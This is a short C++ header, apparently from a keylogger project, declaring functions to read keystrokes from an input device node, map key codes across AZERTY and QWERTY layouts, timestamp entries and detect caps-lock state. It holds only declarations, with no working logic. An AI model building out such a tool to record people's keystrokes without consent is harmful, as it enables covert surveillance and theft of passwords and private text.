#ifndef __RKEYLOGGER_APK__
#define  __RKEYLOGGER_APK__
    
    #include <string>
    
    enum class Layout { AZERTY, QWERTY };
    enum class KeyboardMode { SHIFT, ALTGR, NORMAL };
    
    struct KeyValue{
        const char* normal;
        const char* shift;
        const char* altgr;
    };

    void read_devnode(const char* devnode);
    int map_code(int code, int value);

    //TODO
    void setLayout(Layout layout);

    //UTILS 
    std::string current_datetime();

    //To detect if capslock was already pressed when we launch the programs
    bool capsclock_status();
#endif